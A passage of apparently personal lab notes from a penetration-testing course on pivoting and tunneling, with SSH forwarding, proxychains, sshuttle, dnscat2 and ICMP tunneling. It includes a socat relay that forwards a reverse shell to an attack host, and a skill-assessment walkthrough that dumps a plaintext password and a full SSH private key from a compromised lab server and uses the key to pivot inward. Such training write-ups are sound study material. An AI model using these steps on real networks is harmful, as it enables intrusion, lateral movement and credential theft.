href=#pivoting-tunneling-and-port-forwarding>#</a></h2><h3 id=dynamic-port-forwarding-with-ssh-and-socks-tunneling>Dynamic Port Forwarding with SSH and SOCKS Tunneling<a hidden class=anchor aria-hidden=true href=#dynamic-port-forwarding-with-ssh-and-socks-tunneling>#</a></h3><p><strong>Executing the Local Port Forward</strong></p><p>The <code>-L</code> command tells the SSH client to request the SSH server to forward all the data we send via the port <code>1234</code> to <code>localhost:3306</code> on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port <code>1234</code>. We can use Netstat or Nmap to query our local host on <code>1234</code> port to verify whether the MySQL service was forwarded.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ubuntu@10.129.202.64<span class=err>&#39;</span>s password:
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.3 LTS <span class=o>(</span>GNU/Linux 5.4.0-91-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Thu <span class=m>24</span> Feb <span class=m>2022</span> 05:23:20 PM UTC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:             0.0
</span></span><span class=line><span class=cl>  Usage of /:              28.4% of 13.72GB
</span></span><span class=line><span class=cl>  Memory usage:            34%
</span></span><span class=line><span class=cl>  Swap usage:              0%
</span></span><span class=line><span class=cl>  Processes:               <span class=m>175</span>
</span></span><span class=line><span class=cl>  Users logged in:         <span class=m>1</span>
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> ens192: 10.129.202.64
</span></span><span class=line><span class=cl>  IPv6 address <span class=k>for</span> ens192: dead:beef::250:56ff:feb9:52eb
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> ens224: 172.16.5.129
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Super-optimized <span class=k>for</span> small spaces - <span class=nb>read</span> how we shrank the memory
</span></span><span class=line><span class=cl>   footprint of MicroK8s to make it the smallest full K8s around.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   https://ubuntu.com/blog/microk8s-memory-optimisation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>66</span> updates can be applied immediately.
</span></span><span class=line><span class=cl><span class=m>45</span> of these updates are standard security updates.
</span></span><span class=line><span class=cl>To see these additional updates run: apt list --upgradable
</span></span></code></pre></div><p><strong>Forwarding Multiple Ports</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
</span></span></code></pre></div><p><strong>Enabling Dynamic Port Forwarding with SSH</strong></p><p>The <code>-D</code> argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool&rsquo;s packets over the port <code>9050</code>. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application&rsquo;s TCP traffic to go through hosted proxies like <code>SOCKS4</code>/<code>SOCKS5</code>, <code>TOR</code>, or <code>HTTP</code>/<code>HTTPS</code> proxies.</p><p>To inform proxychains that we must use port <code>9050</code>, we must modify the proxychains configuration file located at <code>/etc/proxychains.conf</code>. We can add <code>socks4 127.0.0.1 9050</code> to the last line if it is not already there.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ ssh -D <span class=m>9050</span> ubuntu@10.129.202.64
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ tail -4 /etc/proxychains.conf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># meanwile</span>
</span></span><span class=line><span class=cl><span class=c1># defaults set to &#34;tor&#34;</span>
</span></span><span class=line><span class=cl>socks4 127.0.0.1 <span class=m>9050</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ proxychains nmap -v -sn 172.16.5.1-200
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ProxyChains-3.1 <span class=o>(</span>http://proxychains.sf.net<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-02-24 12:30 EST
</span></span><span class=line><span class=cl>Initiating Ping Scan at 12:30
</span></span><span class=line><span class=cl>Scanning <span class=m>10</span> hosts <span class=o>[</span><span class=m>2</span> ports/host<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span>S-chain<span class=p>|</span>-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.2:80-&lt;--timeout
</span></span><span class=line><span class=cl><span class=p>|</span>S-chain<span class=p>|</span>-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.5:80-&lt;&gt;&lt;&gt;-OK
</span></span><span class=line><span class=cl><span class=p>|</span>S-chain<span class=p>|</span>-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.6:80-&lt;--timeout
</span></span><span class=line><span class=cl>RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span></code></pre></div><h3 id=remotereverse-port-fowarding-with-ssh>Remote/Reverse Port Fowarding with SSH<a hidden class=anchor aria-hidden=true href=#remotereverse-port-fowarding-with-ssh>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN
</span></span></code></pre></div><p><figure class=image-caption><img alt="Reverse Port Forwarding" srcset="/posts/htb/pentester/images/44_hu8709244833055834243.webp 480w,
/posts/htb/pentester/images/44_hu14984954838320687283.webp 768w,
/posts/htb/pentester/images/44_hu15657412153245342238.webp 1024w" sizes=100vw src=images/44.webp width=768 height=333 loading=lazy><figcaption></figcaption></figure></p><h3 id=socat-redirection-with-a-reverse-shell>Socat Redirection with a Reverse Shell<a hidden class=anchor aria-hidden=true href=#socat-redirection-with-a-reverse-shell>#</a></h3><p>Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit&rsquo;s listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.</p><p>Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host&rsquo;s listener, where we would be getting a shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
</span></span></code></pre></div><h3 id=ssh-pivoting-with-sshuttle>SSH Pivoting with Sshuttle<a hidden class=anchor aria-hidden=true href=#ssh-pivoting-with-sshuttle>#</a></h3><p><a href=https://github.com/sshuttle/sshuttle title=Sshuttle target=_blank rel="nofollow noopener">Sshuttle</a> is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. <code>Sshuttle</code> can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap&rsquo;s network traffic with sshuttle using the example later in this section.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting sshuttle proxy <span class=o>(</span>version 1.1.0<span class=o>)</span>.
</span></span><span class=line><span class=cl>c : Starting firewall manager with command: <span class=o>[</span><span class=s1>&#39;/usr/bin/python3&#39;</span>, <span class=s1>&#39;/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py&#39;</span>, <span class=s1>&#39;-v&#39;</span>, <span class=s1>&#39;--method&#39;</span>, <span class=s1>&#39;auto&#39;</span>, <span class=s1>&#39;--firewall&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>fw: Starting firewall with Python version 3.9.2
</span></span><span class=line><span class=cl>fw: ready method name nat.
</span></span><span class=line><span class=cl>c : IPv6 enabled: Using default IPv6 listen address ::1
</span></span><span class=line><span class=cl>c : Method: nat
</span></span><span class=line><span class=cl>c : IPv4: on
</span></span><span class=line><span class=cl>c : IPv6: on
</span></span><span class=line><span class=cl>c : UDP : off <span class=o>(</span>not available with nat method<span class=o>)</span>
</span></span><span class=line><span class=cl>c : DNS : off <span class=o>(</span>available<span class=o>)</span>
</span></span><span class=line><span class=cl>c : User: off <span class=o>(</span>available<span class=o>)</span>
</span></span><span class=line><span class=cl>c : Subnets to forward through remote host <span class=o>(</span>type, IP, cidr mask width, startPort, endPort<span class=o>)</span>:
</span></span><span class=line><span class=cl>c :   <span class=o>(</span>&lt;AddressFamily.AF_INET: 2&gt;, <span class=s1>&#39;172.16.5.0&#39;</span>, 32, 0, 0<span class=o>)</span>
</span></span><span class=line><span class=cl>c : Subnets to exclude from forwarding:
</span></span><span class=line><span class=cl>c :   <span class=o>(</span>&lt;AddressFamily.AF_INET: 2&gt;, <span class=s1>&#39;127.0.0.1&#39;</span>, 32, 0, 0<span class=o>)</span>
</span></span><span class=line><span class=cl>c :   <span class=o>(</span>&lt;AddressFamily.AF_INET6: 10&gt;, <span class=s1>&#39;::1&#39;</span>, 128, 0, 0<span class=o>)</span>
</span></span><span class=line><span class=cl>c : TCP redirector listening on <span class=o>(</span><span class=s1>&#39;::1&#39;</span>, 12300, 0, 0<span class=o>)</span>.
</span></span><span class=line><span class=cl>c : TCP redirector listening on <span class=o>(</span><span class=s1>&#39;127.0.0.1&#39;</span>, 12300<span class=o>)</span>.
</span></span><span class=line><span class=cl>c : Starting client with Python version 3.9.2
</span></span><span class=line><span class=cl>c : Connecting to server...
</span></span><span class=line><span class=cl>ubuntu@10.129.202.64<span class=err>&#39;</span>s password:
</span></span><span class=line><span class=cl> s: Running server on remote host with /usr/bin/python3 <span class=o>(</span>version 3.8.10<span class=o>)</span>
</span></span><span class=line><span class=cl> s: latency control <span class=nv>setting</span> <span class=o>=</span> True
</span></span><span class=line><span class=cl> s: auto-nets:False
</span></span><span class=line><span class=cl>c : Connected to server.
</span></span><span class=line><span class=cl>fw: setting up.
</span></span><span class=line><span class=cl>fw: ip6tables -w -t nat -N sshuttle-12300
</span></span><span class=line><span class=cl>fw: ip6tables -w -t nat -F sshuttle-12300
</span></span><span class=line><span class=cl>fw: ip6tables -w -t nat -I OUTPUT <span class=m>1</span> -j sshuttle-12300
</span></span><span class=line><span class=cl>fw: ip6tables -w -t nat -I PREROUTING <span class=m>1</span> -j sshuttle-12300
</span></span><span class=line><span class=cl>fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
</span></span><span class=line><span class=cl>fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
</span></span><span class=line><span class=cl>fw: iptables -w -t nat -N sshuttle-12300
</span></span><span class=line><span class=cl>fw: iptables -w -t nat -F sshuttle-12300
</span></span><span class=line><span class=cl>fw: iptables -w -t nat -I OUTPUT <span class=m>1</span> -j sshuttle-12300
</span></span><span class=line><span class=cl>fw: iptables -w -t nat -I PREROUTING <span class=m>1</span> -j sshuttle-12300
</span></span><span class=line><span class=cl>fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
</span></span><span class=line><span class=cl>fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
</span></span><span class=line><span class=cl>fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports <span class=m>12300</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
</span></span></code></pre></div><h3 id=dns-tunneling-with-dnscat2>DNS Tunneling with Dnscat2<a hidden class=anchor aria-hidden=true href=#dns-tunneling-with-dnscat2>#</a></h3><p><a href=https://github.com/iagox86/dnscat2 title=Dnscat2 target=_blank rel="nofollow noopener">Dnscat2</a> is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted <code>Command-&-Control</code> (<code>C&amp;C</code> or <code>C2</code>) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.</p><h3 id=socks5-tunneling-with-chisel>SOCKS5 Tunneling with Chisel<a hidden class=anchor aria-hidden=true href=#socks5-tunneling-with-chisel>#</a></h3><p><a href=https://github.com/jpillora/chisel title=Chisel target=_blank rel="nofollow noopener">Chisel</a> is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. <code>Chisel</code> can create a client-server tunnel connection in a firewall restricted environment.</p><h3 id=icmp-tunneling-with-socks>ICMP Tunneling with SOCKS<a hidden class=anchor aria-hidden=true href=#icmp-tunneling-with-socks>#</a></h3><p>ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server. <a href=https://github.com/utoni/ptunnel-ng title=ptunnel-ng target=_blank rel="nofollow noopener">ptunnel-ng</a> is a great tool that allows us to do this.</p><h3 id=skill-assessment>Skill Assessment<a hidden class=anchor aria-hidden=true href=#skill-assessment>#</a></h3><p>IP: 10.129.208.79</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>www-data@inlanefreight.local:…/www/html# ifconfig
</span></span><span class=line><span class=cl>ens160: <span class=nv>flags</span><span class=o>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class=m>1500</span>
</span></span><span class=line><span class=cl>        inet 10.129.208.79  netmask 255.255.0.0  broadcast 10.129.255.255
</span></span><span class=line><span class=cl>        inet6 dead:beef::250:56ff:feb9:e9df  prefixlen <span class=m>64</span>  scopeid 0x0&lt;global&gt;
</span></span><span class=line><span class=cl>        inet6 fe80::250:56ff:feb9:e9df  prefixlen <span class=m>64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class=line><span class=cl>        ether 00:50:56:b9:e9:df  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Ethernet<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX packets <span class=m>1531</span>  bytes <span class=m>137646</span> <span class=o>(</span>137.6 KB<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
</span></span><span class=line><span class=cl>        TX packets <span class=m>588</span>  bytes <span class=m>77641</span> <span class=o>(</span>77.6 KB<span class=o>)</span>
</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ens192: <span class=nv>flags</span><span class=o>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class=m>1500</span>
</span></span><span class=line><span class=cl>        inet 172.16.5.15  netmask 255.255.0.0  broadcast 172.16.255.255
</span></span><span class=line><span class=cl>        inet6 fe80::250:56ff:feb9:b964  prefixlen <span class=m>64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class=line><span class=cl>        ether 00:50:56:b9:b9:64  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Ethernet<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX packets <span class=m>332</span>  bytes <span class=m>21095</span> <span class=o>(</span>21.0 KB<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>13</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
</span></span><span class=line><span class=cl>        TX packets <span class=m>13</span>  bytes <span class=m>1006</span> <span class=o>(</span>1.0 KB<span class=o>)</span>
</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>lo: <span class=nv>flags</span><span class=o>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class=m>65536</span>
</span></span><span class=line><span class=cl>        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span class=line><span class=cl>        inet6 ::1  prefixlen <span class=m>128</span>  scopeid 0x10&lt;host&gt;
</span></span><span class=line><span class=cl>        loop  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Local Loopback<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX packets <span class=m>1742</span>  bytes <span class=m>136860</span> <span class=o>(</span>136.8 KB<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
</span></span><span class=line><span class=cl>        TX packets <span class=m>1742</span>  bytes <span class=m>136860</span> <span class=o>(</span>136.8 KB<span class=o>)</span>
</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@inlanefreight.local:…/www/html# netstat -antp
</span></span><span class=line><span class=cl><span class=o>(</span>No info could be <span class=nb>read</span> <span class=k>for</span> <span class=s2>&#34;-p&#34;</span>: geteuid<span class=o>()=</span><span class=m>33</span> but you should be root.<span class=o>)</span>
</span></span><span class=line><span class=cl>Active Internet connections <span class=o>(</span>servers and established<span class=o>)</span>
</span></span><span class=line><span class=cl>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>1</span> 10.129.208.79:34878     1.1.1.1:53              SYN_SENT    -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>1</span> 10.129.208.79:49512     8.8.8.8:53              SYN_SENT    -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::22                   :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::80                   :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> 10.129.208.79:80        10.10.14.247:53140      TIME_WAIT   -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> 10.129.208.79:80        10.10.14.247:37476      ESTABLISHED -
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@inlanefreight.local:/home/webadmin# cat <span class=k>for</span>-admin-eyes-only
</span></span><span class=line><span class=cl><span class=c1># note to self,</span>
</span></span><span class=line><span class=cl>in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
</span></span><span class=line><span class=cl>with a password of :
</span></span><span class=line><span class=cl>Plain Human work!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@inlanefreight.local:/home/webadmin# cat id_rsa
</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class=line><span class=cl>NhAAAAAwEAAQAAAYEAvm9BTps6LPw35+tXeFAw/WIB/ksNIvt5iN7WURdfFlcp+T3fBKZD
</span></span><span class=line><span class=cl>HaOQ1hl1+w/MnF+sO/K4DG6xdX+prGbTr/WLOoELCu+JneUZ3X8ajU/TWB3crYcniFUTgS
</span></span><span class=line><span class=cl>PupztxZpZT5UFjrOD10BSGm1HeI5m2aqcZaxvn4GtXtJTNNsgJXgftFgPQzaOP0iLU42Bn
</span></span><span class=line><span class=cl>IL/+PYNFsP4he27+1AOTNk+8UXDyNftayM/YBlTchv+QMGd9ojr0AwSJ9+eDGrF9jWWLTC
</span></span><span class=line><span class=cl>o9NgqVZO4izemWTqvTcA4pM8OYhtlrE0KqlnX4lDG93vU9CvwH+T7nG85HpH5QQ4vNl+vY
</span></span><span class=line><span class=cl>noRgGp6XIhviY+0WGkJ0alWKFSNHlB2cd8vgwmesCVUyLWAQscbcdB6074aFGgvzPs0dWl
</span></span><span class=line><span class=cl>qLyTTFACSttxC5KOP2x19f53Ut52OCG5pPZbZkQxyfG9OIx3AWUz6rGoNk/NBoPDycw6+Y
</span></span><span class=line><span class=cl>V8c1NVAJakIDRdWQ7eSYCiVDGpzk9sCvjWGVR1UrAAAFmDuKbOc7imznAAAAB3NzaC1yc2
</span></span><span class=line><span class=cl>EAAAGBAL5vQU6bOiz8N+frV3hQMP1iAf5LDSL7eYje1lEXXxZXKfk93wSmQx2jkNYZdfsP
</span></span><span class=line><span class=cl>zJxfrDvyuAxusXV/qaxm06/1izqBCwrviZ3lGd1/Go1P01gd3K2HJ4hVE4Ej7qc7cWaWU+
</span></span><span class=line><span class=cl>VBY6zg9dAUhptR3iOZtmqnGWsb5+BrV7SUzTbICV4H7RYD0M2jj9Ii1ONgZyC//j2DRbD+
</span></span><span class=line><span class=cl>IXtu/tQDkzZPvFFw8jX7WsjP2AZU3Ib/kDBnfaI69AMEiffngxqxfY1li0wqPTYKlWTuIs
</span></span><span class=line><span class=cl>3plk6r03AOKTPDmIbZaxNCqpZ1+JQxvd71PQr8B/k+5xvOR6R+UEOLzZfr2J6EYBqelyIb
</span></span><span class=line><span class=cl>4mPtFhpCdGpVihUjR5QdnHfL4MJnrAlVMi1gELHG3HQetO+GhRoL8z7NHVpai8k0xQAkrb
</span></span><span class=line><span class=cl>cQuSjj9sdfX+d1LedjghuaT2W2ZEMcnxvTiMdwFlM+qxqDZPzQaDw8nMOvmFfHNTVQCWpC
</span></span><span class=line><span class=cl>A0XVkO3kmAolQxqc5PbAr41hlUdVKwAAAAMBAAEAAAGAJ8GuTqzVfmLBgSd+wV1sfNmjNO
</span></span><span class=line><span class=cl>WSPoVloA91isRoU4+q8Z/bGWtkg6GMMUZrfRiVTOgkWveXOPE7Fx6p25Y0B34prPMXzRap
</span></span><span class=line><span class=cl>Ek+sELPiZTIPG0xQr+GRfULVqZZI0pz0Vch4h1oZZxQn/WLrny1+RMxoauerxNK0nAOM8e
</span></span><span class=line><span class=cl>RG23Lzka/x7TCqvOOyuNoQu896eDnc6BapzAOiFdTcWoLMjwAifpYn2uE42Mebf+bji0N7
</span></span><span class=line><span class=cl>ZL+WWPIZ0y91Zk3s7vuysDo1JmxWWRS1ULNusSSnWO+1msn2cMw5qufgrZlG6bblx32mpU
</span></span><span class=line><span class=cl>XC1ylwQmgQjUaFJP1VOt+JrZKFAnKZS1cjwemtjhup+vJpruYKqOfQInTYt9ZZ2SLmgIUI
</span></span><span class=line><span class=cl>NMpXVqIhQdqwSl5RudhwpC+2yroKeyeA5O+g2VhmX4VRxDcPSRmUqgOoLgdvyE6rjJO5AP
</span></span><span class=line><span class=cl>jS0A/I3JTqbr15vm7Byufy691WWHI1GA6jA9/5NrBqyAFyaElT9o+BFALEXX9m1aaRAAAA
</span></span><span class=line><span class=cl>wQDL9Mm9zcfW8Pf+Pjv0hhnF/k93JPpicnB9bOpwNmO1qq3cgTJ8FBg/9zl5b5EOWSyTWH
</span></span><span class=line><span class=cl>4aEQNg3ON5/NwQzdwZs5yWBzs+gyOgBdNl6BlG8c04k1suXx71CeN15BBe72OPctsYxDIr
</span></span><span class=line><span class=cl>0syP7MwiAgrz0XP3jCEwq6XoBrE0UVYjIQYA7+oGgioY2KnapVYDitE99nv1JkXhg0jt/m
</span></span><span class=line><span class=cl>MTrEmSgWmr4yyXLRSuYGLy0DMGcaCA6Rpj2xuRsdrgSv5N0ygAAADBAOVVBtbzCNfnOl6Q
</span></span><span class=line><span class=cl>NpX2vxJ+BFG9tSSdDQUJngPCP2wluO/3ThPwtJVF+7unQC8za4eVD0n40AgVfMdamj/Lkc
</span></span><span class=line><span class=cl>mkEyRejQXQg1Kui/hKD9T8iFw7kJ2LuPcTyvjMyAo4lkUrmHwXKMO0qRaCo/6lBzShVlTK
</span></span><span class=line><span class=cl>u+GTYMG4SNLucNsflcotlVGW44oYr/6Em5lQ3o1OhhoI90W4h3HK8FLqldDRbRxzuYtR13
</span></span><span class=line><span class=cl>DAK7kgvoiXzQwAcdGhXnPMSeWZTlOuTQAAAMEA1JRKN+Q6ERFPn1TqX8b5QkJEuYJQKGXH
</span></span><span class=line><span class=cl>SQ1Kzm02O5sQQjtxy+iAlYOdU41+L0UVAK+7o3P+xqfx/pzZPX8Z+4YTu8Xq41c/nY0kht
</span></span><span class=line><span class=cl>rFHqXT6siZzIfVOEjMi8HL1ffhJVVW9VA5a4S1zp9dbwC/8iE4n+P/EBsLZCUud//bBlSp
</span></span><span class=line><span class=cl>v0bfjDzd4sFLbVv/YWVLDD3DCPC3PjXYHmCpA76qLzlJP26fSMbw7TbnZ2dxum3wyxse5j
</span></span><span class=line><span class=cl><span class=nv>MtiE8P6v7eaf1XAAAAHHdlYmFkbWluQGlubGFuZWZyZWlnaHQubG9jYWwBAgMEBQY</span><span class=o>=</span>
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.247<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-gxwarb3erc<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ssh webadmin@10.129.208.79 -i www.rsa
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>webadmin@inlanefreight:~$ <span class=k>for</span> i in <span class=o>{</span>1..254<span class=o>}</span> <span class=p>;</span><span class=k>do</span> <span class=o>(</span>ping -c <span class=m>1</span> 172.16.5.<span class=nv>$i</span> <span class=p>|</span> grep <span class=s2>&#34;bytes from&#34;</span> <span class=p>&amp;</span><span class=o>)</span> <span class=p>;</span><span class=k>done</span>
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 172.16.5.15: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>time</span><span class=o>=</span>0.026 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 172.16.5.35: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>128</span> <span class=nv>time</span><span class=o>=</span>0.533 ms
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.247<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-gxwarb3erc<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo sshuttle -r webadmin@10.129.208.79 172.16.5.0/23 -v --ssh-cmd <span class=s1>&#39;ssh -i www.rsa&#39;</span>
